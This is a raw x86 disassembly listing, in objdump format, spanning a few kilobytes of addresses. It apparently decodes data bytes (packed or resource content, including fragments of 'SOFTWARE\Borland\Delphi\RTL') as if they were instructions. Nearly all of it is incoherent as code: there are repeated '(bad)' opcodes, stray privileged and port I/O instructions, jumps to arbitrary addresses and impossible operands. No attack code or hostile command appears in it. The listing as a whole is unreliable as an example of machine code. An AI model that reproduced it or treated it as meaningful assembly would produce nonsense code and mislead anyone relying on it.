  41623d:	scas   al,BYTE PTR es:[edi]
  41623e:	mov    al,ds:0xffffff42
  416243:	sbb    ebx,esp
  416245:	mov    ds:0x750c1746,eax
  41624a:	add    DWORD PTR [esi+0x48c97675],0x93a7e44d
  416254:	cmp    DWORD PTR [ebx],edi
  416256:	xor    eax,0x53edb2b8
  41625b:	mov    ds:0xf16ffff5,eax
  416260:	cmp    eax,0x9e015dc5
  416265:	xchg   edx,eax
  416266:	pop    edx
  416267:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416268:	lock mov eax,ds:0xa554c020
  41626e:	mov    WORD PTR [edi],?
  416270:	popa   
  416271:	mov    ebx,DWORD PTR [edx-0x1]
  416274:	(bad)  
  416275:	(bad)  
  416276:	mov    edi,0x895d2522
  41627b:	stc    
  41627c:	(bad)  [edi-0x8]
  41627f:	repz daa 
  416281:	mov    edi,0xdd5dc8a2
  416286:	sub    BYTE PTR [esi-0x65],0x97
  41628a:	and    BYTE PTR [edx-0x3b9fadfe],cl
  416290:	and    eax,0xd559f075
  416295:	and    al,BYTE PTR [eax]
  416297:	mov    bh,0xfe
  416299:	outs   dx,BYTE PTR ds:[esi]
  41629a:	bound  edx,QWORD PTR [ecx]
  41629c:	xor    eax,0x1e7bcaae
  4162a1:	and    eax,0xe8dfcb8c
  4162a6:	add    esi,DWORD PTR [ebp-0x4be08b85]
  4162ac:	xchg   BYTE PTR [edi],al
  4162ae:	jne    0x4162cc
  4162b0:	push   0xffffffa0
  4162b2:	jmp    0x416297
  4162b4:	mov    cl,0x1
  4162b6:	or     esp,DWORD PTR ds:0xdf9ff00
  4162bc:	fadd   QWORD PTR [edi]
  4162be:	push   ss
  4162bf:	xchg   BYTE PTR [eax],ch
  4162c1:	cmp    eax,0xf4c3ef8
  4162c6:	pop    eax
  4162c7:	loop   0x41628d
  4162c9:	pop    ds
  4162ca:	hlt    
  4162cb:	movzx  eax,WORD PTR ds:0x8d8a4020
  4162d2:	shl    DWORD PTR [eax+0x6b],1
  4162d5:	lods   eax,DWORD PTR ds:[esi]
  4162d6:	jns    0x41630c
  4162d8:	inc    edx
  4162d9:	push   0xa068e488
  4162de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162df:	mov    ebx,DWORD PTR [eax*8-0x33b2bb3f]
  4162e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162e7:	sub    BYTE PTR [ebx+esi*1+0x61],0x30
  4162ec:	clc    
  4162ed:	hlt    
  4162ee:	add    al,0x30
  4162f0:	int    0xb2
  4162f2:	(bad)  [edi]
  4162f4:	hlt    
  4162f5:	push   eax
  4162f6:	xor    edi,eax
  4162f8:	add    BYTE PTR [esp+ebp*2-0x4553e76e],ah
  4162ff:	dec    esp
  416300:	shr    DWORD PTR [eax+0x15],1
  416303:	cmc    
  416304:	push   ds
  416305:	and    al,0x6
  416307:	cmp    al,0xc7
  416309:	out    dx,eax
  41630a:	mov    ax,ds:0x5d4bfb70
  416310:	mov    esp,0x66ffc0eb
  416315:	adc    ah,BYTE PTR [esi+0x2d]
  416318:	aas    
  416319:	or     ax,dx
  41631c:	mov    ds:0xc97fff14,ax
  416322:	shr    DWORD PTR [ecx+ecx*1+0x54464f53],1
  416329:	push   edi
  41632a:	inc    ecx
  41632b:	push   edx
  41632c:	inc    ebp
  41632d:	pop    esp
  41632e:	inc    edx
  41632f:	outs   dx,DWORD PTR ds:[esi]
  416330:	jb     0x41639e
  416332:	popa   
  416333:	iret   
  416334:	(bad)  
  416335:	(bad)  
  416336:	jmp    FWORD PTR [esi+0x64]
  416339:	pop    esp
  41633a:	inc    esp
  41633b:	gs ins BYTE PTR es:[edi],dx
  41633d:	jo     0x4163a7
  41633f:	imul   ebx,DWORD PTR [edx+edx*2+0x54],0x5046004c
  416347:	push   ebp
  416348:	dec    ebp
  416349:	popa   
  41634a:	jae    0x4163b7
  41634c:	push   esi
  41634d:	popa   
  41634e:	ins    BYTE PTR es:[edi],dx
  41634f:	jne    0x4163b6
  416351:	fild   DWORD PTR [ebp-0x1c0859a4]
  416357:	fldcw  WORD PTR ds:0x2807eb39
  41635e:	mov    DWORD PTR [ecx],ecx
  416360:	mov    esp,0xb5d470c1
  416365:	mov    cl,BYTE PTR [esi]
  416367:	inc    ecx
  416368:	cmc    
  416369:	add    ebp,esp
  41636b:	mov    db2,eax
  41636e:	test   BYTE PTR [ecx],ah
  416370:	sbb    BYTE PTR [eax],bl
  416372:	test   al,0x8b
  416374:	ror    BYTE PTR ds:0xe0764d8e,1
  41637a:	and    al,0x2b
  41637c:	sbb    edi,DWORD PTR [esi+eax*1+0x18]
  416380:	fdivr  DWORD PTR [ebp+0x6321ad7b]
  416386:	rcl    BYTE PTR [ebx],0x4b
  416389:	mov    db7,esp
  41638c:	test   dl,dl
  41638e:	popa   
  41638f:	add    ebp,ebp
  416391:	dec    eax
  416392:	repz and esp,DWORD PTR [edi+edx*1+0x36b20731]
  41639a:	shl    BYTE PTR [edi-0xf781f9],0x51
  4163a1:	cld    
  4163a2:	ret    
  4163a3:	inc    ebx
  4163a4:	ret    
  4163a5:	push   0xffffffab
  4163a7:	mov    ecx,DWORD PTR [ebx-0x28]
  4163aa:	add    DWORD PTR ds:0x5144b836,0x61490fc1
  4163b4:	pop    ecx
  4163b5:	pusha  
  4163b6:	mov    edx,0x8116ed8
  4163bb:	mov    edx,esp
  4163bd:	adc    eax,0x5f014ab8
  4163c2:	enter  0x2dc1,0x9f
  4163c6:	pop    ebx
  4163c7:	fadd   QWORD PTR [edx]
  4163c9:	or     bl,BYTE PTR [ebx]
  4163cb:	jmp    0x4163ba
  4163cd:	cmp    DWORD PTR [eax-0x2b15a56b],edi
  4163d3:	je     0x4163f2
  4163d5:	xchg   DWORD PTR [ebx],ecx
  4163d7:	jp     0x4163e6
  4163d9:	jae    0x4163eb
  4163db:	mov    ch,0x7b
  4163dd:	sti    
  4163de:	sbb    eax,edi
  4163e0:	push   es
  4163e1:	mov    edi,DWORD PTR [ebx+0x14]
  4163e4:	mov    DWORD PTR [edi+eax*1],esi
  4163e7:	nop    DWORD PTR [ecx+0x75]
  4163eb:	sbb    al,0x75
  4163ed:	jecxz  0x4163ee
  4163ef:	adc    ch,BYTE PTR [esi]
  4163f1:	or     BYTE PTR [ebx+0x56],bl
  4163f4:	mov    eax,ds:0xc0568b36
  4163f9:	mov    esi,DWORD PTR [esi-0x24]
  4163fc:	pop    es
  4163fd:	outs   dx,DWORD PTR ds:[esi]
  4163fe:	sub    BYTE PTR [edi],dl
  416400:	pop    ecx
  416401:	mov    esp,0xd8899c33
  416406:	add    eax,0x5deeec7d
  41640b:	jmp    0x8212eb31
  416410:	stc    
  416411:	repnz push DWORD PTR [ebx+0x11]
  416415:	pop    es
  416416:	(bad)  
  416417:	jb     0x416420
  416419:	shrd   DWORD PTR [edx-0x43],esi,cl
  41641d:	sub    eax,0x21920387
  416422:	jmp    ecx
  416424:	cld    
  416425:	ror    BYTE PTR [eax],1
  416427:	mov    ebp,0xc101edcb
  41642c:	mov    edi,ebx
  41642e:	adc    ecx,ebp
  416430:	aas    
  416431:	xchg   esp,eax
  416432:	sti    
  416433:	out    dx,eax
  416434:	mov    eax,ds:0x5771a01a
  416439:	pop    ss
  41643a:	jge    0x416415
  41643c:	mov    cl,0x2e
  41643e:	sbb    dh,dl
  416440:	popa   
  416441:	lock enter 0x325e,0x0
  416446:	push   es
  416447:	in     eax,dx
  416448:	add    al,BYTE PTR [edi+0x5c]
  41644b:	adc    esp,DWORD PTR [edx]
  41644d:	ins    BYTE PTR es:[edi],dx
  41644e:	mov    esp,DWORD PTR ds:0x380cdba0
  416454:	inc    eax
  416455:	adc    al,0xf1
  416457:	adc    al,0xda
  416459:	inc    esp
  41645a:	fld    TBYTE PTR [edx+0x1389d6ee]
  416460:	mov    DWORD PTR [esi*8+0x638798b],esp
  416467:	mov    edi,0x8d1ae26f
  41646c:	dec    ebp
  41646d:	clc    
  41646e:	and    BYTE PTR [eax+0x18],dl
  416471:	mov    WORD PTR [ecx],fs
  416473:	pushf  
  416474:	mov    ebx,0xc260ee51
  416479:	ds jae 0x4164cc
  41647c:	setne  BYTE PTR [edx+0x6126e1cf]
  416483:	fdivr  st,st(5)
  416485:	gs push 0xc9b31c20
  41648b:	pop    es
  41648c:	mov    eax,ds:0x8bf0c47c
  416491:	ret    
  416492:	pop    edi
  416493:	out    dx,eax
  416494:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416495:	or     bl,ch
  416497:	adc    al,BYTE PTR [eax]
  416499:	mov    eax,0xde582968
  41649e:	in     eax,dx
  41649f:	sbb    esi,DWORD PTR [ebp-0xb]
  4164a2:	mov    esi,DWORD PTR [edx]
  4164a4:	cmp    esi,DWORD PTR [eax]
  4164a6:	sbb    dh,BYTE PTR [edx+0x34]
  4164a9:	jo     0x4164af
  4164ab:	jne    0x4164bd
  4164ad:	pop    es
  4164ae:	jbe    0x416453
  4164b0:	xchg   esi,eax
  4164b1:	xchg   edi,eax
  4164b2:	or     BYTE PTR [eax],cl
  4164b4:	jne    0x4164be
  4164b6:	or     al,0xf5
  4164b8:	je     0x4164cd
  4164ba:	and    BYTE PTR [eax-0x48],dl
  4164bd:	test   BYTE PTR [esi-0x3aaa23d3],al
  4164c3:	jnp    0x4164fa
  4164c5:	aam    0x4d
  4164c7:	enter  0x5b13,0x12
  4164cb:	or     eax,0xce40353
  4164d0:	cdq    
  4164d1:	sbb    eax,0xfc0423cc
  4164d6:	sbb    esp,DWORD PTR [ecx-0x5dd7cc30]
  4164dc:	pop    ds
  4164dd:	push   edi
  4164de:	xchg   esi,eax
  4164df:	in     eax,0x55
  4164e1:	mov    DWORD PTR [ebx],ebx
  4164e3:	pop    ebx
  4164e4:	mov    cl,0x7e
  4164e6:	rol    BYTE PTR [eax+0x510fee0d],1
  4164ec:	cmc    
  4164ed:	or     eax,0x27c4b0f
  4164f2:	repnz scas ax,WORD PTR es:[edi]
  4164f5:	cmp    eax,0x7ef66659
  4164fa:	ret    
  4164fb:	jae    0x41652a
  4164fd:	jle    0x416482
  4164ff:	pop    eax
  416500:	mov    dh,0x29
  416502:	enter  0x748b,0x47
  416506:	or     dl,BYTE PTR [edi-0x47147dd3]
  41650c:	mov    ebp,0x74d03900
  416511:	jns    0x416553
  416513:	fdiv   st(3),st
  416515:	repz inc edi
  416517:	call   FWORD PTR [esi]
  416519:	neg    BYTE PTR [ebx+eax*8-0x48]
  41651d:	pop    esi
  41651e:	sbb    BYTE PTR [ebx],0x4f
  416521:	add    edx,DWORD PTR [esi+0x66]
  416524:	fadd   DWORD PTR [eax]
  416526:	fdiv   QWORD PTR cs:[ecx+0x17ce0966]
  41652d:	data16 (bad) 
  41652f:	shl    BYTE PTR [esi],0xf5
  416532:	rcl    DWORD PTR [eax-0x27],0x21
  416536:	dec    eax
  416537:	aam    0x58
  416539:	adc    al,0xf1
  41653b:	pop    esi
  41653c:	push   ss
  41653d:	push   0x3b
  41653f:	push   ss
  416540:	xchg   esp,eax
  416541:	pop    esi
  416542:	cs popa 
  416544:	lock cmp esp,DWORD PTR [esi+0xbd43753]
  41654b:	aaa    
  41654c:	dec    ecx
  41654d:	jl     0x416552
  41654f:	cmp    eax,0xa8d231f4
  416554:	mov    ebx,DWORD PTR fs:[edx]
  416557:	mov    al,ds:0x89a37fa6
  41655c:	pop    eax
  41655d:	imul   ecx,DWORD PTR [eax],0x810441c7
  416563:	xor    edi,DWORD PTR [ecx+0x41]
  416566:	dec    ebp
  416567:	jge    0x4165c1
  416569:	pop    eax
  41656a:	jp     0x416576
  41656c:	adc    ebx,DWORD PTR [edx+0x22]
  41656f:	and    al,0xbc
  416571:	jmp    0x6f55:0xa1a5e32c
  416578:	adc    eax,0x5081b20e
  41657d:	jno    0x416595
  41657f:	sbb    eax,0x8458a310
  416584:	jae    0x4165ce
  416586:	inc    edi
  416587:	inc    esi
  416588:	fbstp  TBYTE PTR [eax]
  41658a:	ds adc bh,bh
  41658d:	push   edx
  41658e:	clc    
  41658f:	mov    edi,0xd1c1e40c
  416594:	out    0xe8,eax
  416596:	shl    BYTE PTR ss:[edi+edi*2+0x1],0x14
  41659c:	adc    eax,ebp
  41659e:	je     0x416573
  4165a0:	push   edx
  4165a1:	lods   eax,DWORD PTR ds:[esi]
  4165a2:	or     esi,DWORD PTR [edi+0x4a]
  4165a5:	and    al,0x18
  4165a7:	add    DWORD PTR [esi+0x11],esi
  4165aa:	xor    ebx,DWORD PTR [ebx-0x44]
  4165ad:	jmp    0xfb210852
  4165b2:	in     eax,dx
  4165b3:	push   cs
  4165b4:	ficom  WORD PTR [ebx+ebx*1]
  4165b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165b8:	jnp    0x416595
  4165ba:	push   cs
  4165bb:	add    BYTE PTR [ebx+0x6a543050],bh
  4165c1:	add    bl,BYTE PTR ds:0xbbdb34e4
  4165c7:	xchg   ecx,eax
  4165c8:	xor    al,0x8
  4165ca:	pop    eax
  4165cb:	addr16 pop ss
  4165cd:	add    eax,esp
  4165cf:	sti    
  4165d0:	mov    al,0xc8
  4165d2:	add    BYTE PTR [edi+edx*2],0x7
  4165d6:	push   eax
  4165d7:	push   ebx
  4165d8:	mov    cl,0x1a
  4165da:	cld    
  4165db:	sbb    eax,0xf2130cef
  4165e0:	sbb    DWORD PTR [ebx+0x39800141],ecx
  4165e6:	jmp    0xa3b594e4
  4165eb:	fild   WORD PTR [ebx+ebp*8]
  4165ee:	jne    0x4165fc
  4165f0:	movsx  edx,BYTE PTR ds:0xc160eb41
  4165f7:	add    eax,0x35cc3a33
  4165fc:	xchg   ebp,eax
  4165fd:	fwait
  4165fe:	xor    ebx,DWORD PTR ds:0xe491acb4
  416604:	in     al,dx
  416605:	and    al,0x38
  416607:	push   ecx
  416608:	pop    ebp
  416609:	loope  0x41661e
  41660b:	mov    bl,0xdc
  41660d:	and    al,0x67
  41660f:	movlps xmm2,QWORD PTR [edx+0x1f]
  416613:	loop   0x41666f
  416615:	(bad)  
  416617:	mov    dl,0xb3
  416619:	ret    
  41661a:	sbb    eax,0x1ce3b210
  41661f:	pop    eax
  416620:	arpl   WORD PTR [ecx+0x2400dd1c],bp
  416626:	test   DWORD PTR [eax+0x4],0xe1fedd5a
  41662d:	out    dx,al
  41662e:	push   0x38814413
  416633:	fisub  WORD PTR [ecx]
  416635:	stos   BYTE PTR es:[edi],al
  416636:	dec    eax
  416637:	adc    al,0x74
  416639:	outs   dx,BYTE PTR ds:[esi]
  41663a:	mov    ds:0xb409bee1,al
  41663f:	and    BYTE PTR [eax+0x2f10158b],dh
  416645:	ror    ah,cl
  416647:	push   esi
  416648:	js     0x416624
  41664a:	adc    ecx,esi
  41664c:	dec    ebx
  41664d:	shl    BYTE PTR [edi+0x9],cl
  416650:	out    0xf8,eax
  416652:	outs   dx,DWORD PTR ds:[esi]
  416653:	aad    0xa9
  416655:	cmp    eax,0xce3981f8
  41665a:	cli    
  41665b:	out    dx,eax
  41665c:	push   cs
  41665d:	je     0x416696
  41665f:	xor    eax,0x59
  416662:	js     0x4166d6
  416664:	call   0x29b78e8e
  416669:	cs ja  0x416641
  41666c:	clc    
  41666d:	sbb    al,BYTE PTR [eax-0x3eafe4e0]
  416673:	add    dh,ch
  416675:	mul    BYTE PTR [edx-0x4f]
  416678:	ins    DWORD PTR es:[edi],dx
  416679:	rcr    DWORD PTR [eax+0x3b],cl
  41667c:	stos   DWORD PTR es:[edi],eax
  41667d:	dec    esp
  41667e:	jp     0x4166e4
  416680:	jl     0x416618
  416682:	lods   al,BYTE PTR ds:[esi]
  416683:	lds    ecx,FWORD PTR [edi*4+0x76013a0a]
  41668a:	push   ds
  41668b:	mov    al,0xad
  41668d:	mov    ds:0xfe501587,eax
  416692:	or     ch,bh
  416694:	push   eax
  416695:	cmp    al,0x70
  416697:	mov    cl,0xd1
  416699:	fucomp st(7)
  41669b:	je     0x41670d
  41669d:	sbb    DWORD PTR [ecx+0x2],0xffffffa3
  4166a1:	jbe    0x416629
  4166a3:	sbb    esp,DWORD PTR ds:0x531b159d
  4166a9:	sbb    al,0x87
  4166ab:	sub    BYTE PTR [edx-0x36],ch
  4166ae:	ins    BYTE PTR es:[edi],dx
  4166af:	(bad)  [esi+0x3435983a]
  4166b5:	push   edx
  4166b6:	fcomp  QWORD PTR [eax]
  4166b8:	mov    edi,0xb36a31ef
  4166bd:	sub    bl,dh
  4166bf:	push   DWORD PTR [eax+0x5a06d00]
  4166c5:	mov    ebp,DWORD PTR [edi-0x51]
  4166c8:	xchg   esi,eax
  4166c9:	sti    
  4166ca:	sbb    ebx,DWORD PTR [edi+0x47c7045f]
  4166d0:	add    al,0xc4
  4166d2:	sub    BYTE PTR [ecx-0x59],cl
  4166d5:	mov    cl,0x93
  4166d7:	mov    dh,ah
  4166d9:	and    al,0x24
  4166db:	jmp    ebx
  4166dd:	sub    ecx,DWORD PTR gs:[eax+0x67ddd426]
  4166e4:	test   eax,0x41002611
  4166e9:	or     BYTE PTR [edx],bl
  4166eb:	and    DWORD PTR [eax],ebx
  4166ed:	mov    eax,0xe1040704
  4166f2:	fldcw  WORD PTR [ebx]
  4166f4:	mov    bh,0x2f
  4166f6:	les    ecx,FWORD PTR [edx+0x1f741f6f]
  4166fc:	mov    ecx,DWORD PTR [edx+0x4c]
  4166ff:	inc    edx
  416700:	add    al,0x1c
  416702:	test   BYTE PTR ss:[ecx],0x7f
  416706:	xchg   BYTE PTR [esi],al
  416708:	into   
  416709:	mov    ecx,0xd1ff5853
  41670e:	ss jb  0x416746
  416711:	int3   
  416712:	cmp    eax,0xd874fb37
  416717:	lock icebp 
  416719:	lahf   
  41671a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41671b:	sbb    al,0xe8
  41671d:	pop    edx
  41671e:	push   esp
  41671f:	push   ebp
  416720:	push   edi
  416721:	push   esi
  416722:	push   ebx
  416723:	inc    ecx
  416724:	pop    es
  416725:	bound  ebp,QWORD PTR [edi+eax*4+0x42]
  416729:	mov    ebx,0x6025b26c
  41672e:	xor    esi,DWORD PTR [bx+0x5fed]
  416733:	xor    bh,al
  416735:	pop    ebx
  416736:	xchg   edi,eax
  416737:	dec    edi
  416738:	lea    eax,[ebp-0x3d964f6]
  41673e:	mov    bl,0x89
  416740:	xchg   ebp,eax
  416741:	inc    edx
  416742:	or     al,0x83
  416744:	pusha  
  416745:	add    al,0xfd
  416747:	lahf   
  416748:	mov    edx,0x28d80842
  41674d:	cmp    eax,0x739ce8bc
  416752:	int3   
  416753:	(bad)  
  416754:	addr16 adc al,0xec
  416757:	xor    al,BYTE PTR [edi+0x5d]
  41675a:	or     al,0x10
  41675c:	pop    ecx
  41675d:	add    al,0x7a
  41675f:	lea    ecx,[eax-0x52]
  416762:	repnz and DWORD PTR [bx+di],edi
  416766:	pop    edx
  416767:	mov    esp,DWORD PTR [esp+0x2c]
  41676b:	jne    0x4166ef
  41676d:	pop    ss
  41676e:	jp     0x41678b
  416770:	mov    edx,0xe23db65d
  416775:	ret    
  416776:	xor    DWORD PTR [ebx-0x69421193],edi
  41677c:	jmp    0xc943814c
  416781:	ret    0xc30c
  416784:	fistp  DWORD PTR [ebx-0x35]
  416787:	rcl    BYTE PTR [edi],0xb4
  41678a:	pop    ss
  41678b:	add    bh,BYTE PTR ds:0x70c04092
  416791:	xor    edi,edi
  416793:	std    
  416794:	jg     0x4167c2
  416796:	je     0x4167f4
  416798:	cmp    eax,0x7415088e
  41679d:	push   edi
  41679e:	sub    eax,0x872d0f05
  4167a3:	std    
  4167a4:	jg     0x41678f
  4167a6:	call   DWORD PTR [edx]
  4167a8:	cmp    eax,0xeb4e7448
  4167ad:	pusha  
  4167ae:	add    eax,0x833ff971
  4167b3:	call   0x7477d9ba
  4167b8:	xor    bl,ch
  4167ba:	push   edx
  4167bb:	cmp    eax,0x3db6fd96
  4167c0:	jmp    FWORD PTR [ecx]
  4167c2:	adc    DWORD PTR [ebp+edi*1+0x2d],esi
  4167c6:	xchg   ebx,eax
  4167c7:	and    dl,BYTE PTR cs:[ebx]
  4167ca:	add    ah,BYTE PTR [ebx+ebp*8]
  4167cd:	cmp    ch,BYTE PTR ds:0xffe8dffd
  4167d3:	test   BYTE PTR [esi],0x2f
  4167d6:	daa    
  4167d7:	cmp    eax,0x2ceb2674
  4167dc:	mov    al,0xc8
  4167de:	jmp    0x41680a
  4167e0:	mov    al,0x28
  4167e2:	es mov al,0xcd
  4167e5:	jmp    0x416851
  4167e7:	test   eax,0xb022fbbf
  4167ec:	iret   
  4167ed:	jmp    0x41680d
  4167ef:	bndldx (bad),[eax-0x4fe91429]
  4167f6:	into   
  4167f7:	mov    ecx,0xea5d06b0
  4167fc:	fbstp  TBYTE PTR ds:0xebdab00e
  416802:	or     dh,BYTE PTR [eax-0x354fec27]
  416808:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416809:	lock add BYTE PTR [edi-0x3700cf7b],bh
  416810:	push   edx
  416811:	or     al,0xe4
  416813:	pop    ebp
  416814:	pop    esp
  416815:	xchg   ecx,eax
  416816:	xor    BYTE PTR [edx],cl
  416818:	addr16 (bad) 
  41681a:	mov    bl,0x61
  41681c:	sbb    al,0xe0
  41681e:	xor    BYTE PTR [edx+0xf],al
  416821:	inc    eax
  416822:	aas    
  416823:	lahf   
  416824:	mov    ds,WORD PTR [ecx]
  416826:	out    dx,eax
  416827:	je     0x41689a
  416829:	sub    ch,dl
  41682b:	xor    eax,0x3037ce08
  416830:	push   edx
  416831:	(bad)  
  416832:	and    eax,0x3bcc5c
  416837:	push   ebx
  416838:	jne    0x416853
  41683a:	or     eax,0x1843c82e
  41683f:	cmp    dl,0xfa
  416842:	fcomp  QWORD PTR [ecx]
  416844:	or     eax,0xfc56821a
  416849:	out    dx,al
  41684a:	or     eax,ebx
  41684c:	imul   edi,ecx,0x247d21d7
  416852:	pushf  
  416853:	mov    ecx,DWORD PTR ds:0xd02bcb41
  416859:	stos   BYTE PTR es:[edi],al
  41685a:	fbld   TBYTE PTR [edi]
  41685c:	or     al,0xb8
  41685e:	fstp   DWORD PTR [edx+0x122d1451]
  416864:	scas   al,BYTE PTR es:[edi]
  416865:	pop    eax
  416866:	(bad)  
  416868:	xor    edi,edi
  41686a:	(bad)  
  41686d:	or     al,BYTE PTR [esi+0x520aa185]
  416873:	outs   dx,BYTE PTR ds:[esi]
  416874:	in     al,0x88
  416876:	aaa    
  416877:	out    0xa2,al
  416879:	out    dx,eax
  41687a:	je     0x416805
  41687c:	push   0x5a34a308
  416881:	pop    ds
  416882:	mov    eax,ds:0xbb035c0a
  416887:	scas   al,BYTE PTR es:[edi]
  416888:	rcr    DWORD PTR [eiz*1+0xc3c839],0x2b
  416890:	sar    BYTE PTR [esi-0x7f],1
  416893:	pop    ss
  416894:	jns    0x41689f
  416896:	cmp    ecx,0xffffff81
  416899:	or     BYTE PTR [ecx],bh
  41689b:	add    DWORD PTR [ebp-0xb],esi
  41689e:	adc    BYTE PTR [ebx-0x64],al
  4168a1:	or     al,0x4a
  4168a3:	es lahf 
  4168a5:	mov    esi,0x94578630
  4168aa:	loop   0x41691a
  4168ac:	inc    esi
  4168ad:	or     BYTE PTR [ecx],dh
  4168af:	push   esp
  4168b0:	mov    ebx,DWORD PTR [esi-0x1c]
  4168b3:	fisub  DWORD PTR ds:0xa903f218
  4168b9:	lds    edi,FWORD PTR [eax]
  4168bb:	jmp    0x416875
  4168bd:	bound  eax,QWORD PTR [edi]
  4168bf:	out    dx,al
  4168c0:	sbb    ecx,DWORD PTR [ebx-0x77]
  4168c3:	sbb    edi,DWORD PTR [edx+0x44]
  4168c6:	fadd   DWORD PTR [ebp+ebp*4+0x41]
  4168ca:	adc    DWORD PTR [edi],0x1a7d5453
  4168d0:	adc    BYTE PTR [ecx-0x1a803e79],al
  4168d6:	jb     0x4168c3
  4168d8:	adc    al,0x43
  4168da:	lock inc bp
  4168dd:	ss das 
  4168df:	sub    BYTE PTR [esp+eax*1-0x64],ch
  4168e3:	jno    0x41686e
  4168e5:	xchg   ebx,eax
  4168e6:	xchg   ecx,eax
  4168e7:	retf   
  4168e8:	outs   dx,DWORD PTR ds:[esi]
  4168e9:	mov    edi,0xdf1d3047
  4168ee:	vmwrite ebx,DWORD PTR [ecx+0x70]
  4168f2:	xor    eax,0x7ef33b39
  4168f7:	sbb    ch,BYTE PTR [esp+eax*1+0x40]
  4168fb:	fnstcw WORD PTR ds:[ebx-0x76bc9428]
  416902:	pop    edi
  416903:	or     al,0x6f
  416905:	cmp    esi,ebx
  416907:	jg     0x4168ef
  416909:	imul   edx,DWORD PTR [ecx],0x4f
  41690c:	daa    
  41690d:	mov    DWORD PTR ds:0x9e8880a,0x669b118d
  416917:	sbb    BYTE PTR [eax+0x3c7838a3],dl
  41691d:	mov    ecx,0xd8036f4b
  416922:	adc    eax,0xa3758740
  416927:	sub    al,0x1d
  416929:	in     al,0x3a
  41692b:	out    0xfe,al
  41692d:	inc    ebx
  41692e:	and    al,0xc6
  416930:	add    eax,0xdc0b0a34
  416935:	ret    
  416936:	pop    ss
  416937:	outs   dx,DWORD PTR ds:[esi]
  416938:	sbb    eax,0x8b5dbfc4
  41693d:	cmp    al,0x18
  41693f:	lea    esi,[eax+ebx*1+0x4]
  416943:	cmc    
  416944:	push   ss
  416945:	mov    WORD PTR [eax],ds
  416947:	add    edx,ebx
  416949:	or     al,0xfe
  41694b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41694c:	adc    ecx,DWORD PTR [ebp+0x22]
  41694f:	(bad)  
  416950:	or     BYTE PTR [edi+0x75],cl
  416953:	jmp    0x4169b3
  416955:	pop    edi
  416956:	fbld   TBYTE PTR [ebp+0x2758070a]
  41695c:	add    ecx,DWORD PTR [ebp-0x7a]
  41695f:	mov    ebx,0x261ab659
  416965:	or     al,0xec
  416967:	gs push 0xba1f4044
  41696d:	inc    esp
  41696e:	mov    cl,0x57
  416970:	sbb    eax,0xbfc36800
  416975:	ins    BYTE PTR es:[edi],dx
  416976:	pop    edi
  416977:	sbb    bh,0x17
  41697a:	cdq    
  41697b:	idiv   edi
  41697d:	add    dl,0x30
  416980:	vunpcklps xmm0,xmm6,XMMWORD PTR [esi]
  416985:	adc    edi,DWORD PTR [ebx-0x63e4af41]
  41698b:	sti    
  41698c:	pop    eax
  41698d:	dec    ecx
  41698e:	clc    
  41698f:	(bad)  [ecx+0x7704a11c]
  416995:	rcr    DWORD PTR [ebp+0x7d],0x2b
  416999:	rcl    al,1
  41699b:	mov    dl,BYTE PTR [edx-0x75247178]
  4169a1:	fld    DWORD PTR [ebp+0x13]
  4169a4:	pop    ebp
  4169a5:	ins    DWORD PTR es:[edi],dx
  4169a6:	sub    DWORD PTR [esi],ebx
  4169a8:	iret   
  4169a9:	dec    ecx
  4169aa:	sbb    ah,dh
  4169ac:	or     edi,edi
  4169ae:	fstp   QWORD PTR [eax+0x58715b7]
  4169b4:	push   ebx
  4169b5:	neg    eax
  4169b7:	sbb    eax,eax
  4169b9:	inc    eax
  4169ba:	pop    ebx
  4169bb:	sub    edi,DWORD PTR [esi+0x185feb7d]
  4169c1:	lahf   
  4169c2:	adc    al,0xff
  4169c4:	ja     0x4169e2
  4169c6:	add    ah,BYTE PTR [eax]
  4169c8:	mov    esi,DWORD PTR [edi]
  4169ca:	mov    ecx,0xd271b0d6
  4169cf:	mov    dh,0xf3
  4169d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169d2:	sub    al,0xc9
  4169d4:	jg     0x416a27
  4169d6:	iret   
  4169d7:	inc    esp
  4169d8:	xchg   esp,eax
  4169d9:	loopne 0x4169ed
  4169db:	dec    edi
  4169dc:	ins    BYTE PTR es:[edi],dx
  4169dd:	push   edi
  4169de:	cmp    BYTE PTR ds:0x80b83c18,bh
  4169e4:	sti    
  4169e5:	push   es
  4169e6:	lock adc al,0x83
  4169e9:	cmp    eax,0xb6a0920
  4169ee:	mov    eax,0x261b70d1
  4169f3:	dec    esi
  4169f4:	ret    0x530
  4169f7:	shl    DWORD PTR [ecx],1
  4169f9:	ds jle 0x41698b
  4169fc:	lock push 0x1e
  4169ff:	push   0xf9f56aba
  416a04:	jl     0x416a05
  416a06:	adc    DWORD PTR [eax+0x1a9cb0fc],0x2
  416a0d:	push   0x7283af0
  416a12:	lea    esi,[eax+0x5b]
  416a15:	pop    edi
  416a16:	sub    al,0x2f
  416a18:	fsub   QWORD PTR [ebx]
  416a1a:	pop    edx
  416a1b:	stc    
  416a1c:	into   
  416a1d:	pop    esp
  416a1e:	pusha  
  416a1f:	or     DWORD PTR [esi],edi
  416a21:	add    BYTE PTR ds:0x5cbf5cb4,bl
  416a27:	push   ebx
  416a28:	loopne 0x416a2a
  416a2a:	mov    WORD PTR ds:0xbb51eced,cs
  416a30:	sbb    esi,0xbeb37eee
  416a36:	inc    eax
  416a37:	xchg   ebx,eax
  416a38:	cmp    BYTE PTR [ebx+0x28],0x36
  416a3c:	push   ss
  416a3d:	cmp    DWORD PTR [esi],0xffffffa2
  416a40:	lea    ecx,ds:0x3f06a235
  416a46:	and    BYTE PTR [esi],al
  416a48:	(bad)  
  416a49:	cld    
  416a4a:	jae    0x4169d3
  416a4c:	(bad)  
  416a4d:	push   eax
  416a4e:	call   0xf747:0x190ca1ef
  416a55:	or     al,0x1b
  416a57:	mov    ds:0x642a5929,al
  416a5c:	enter  0x3513,0xec
  416a60:	mov    al,bl
  416a62:	jbe    0x416a66
  416a64:	jne    0x416a74
  416a66:	pop    ds
  416a67:	add    BYTE PTR [ebp+0x79],dh
  416a6a:	inc    ebx
  416a6b:	or     al,0x41
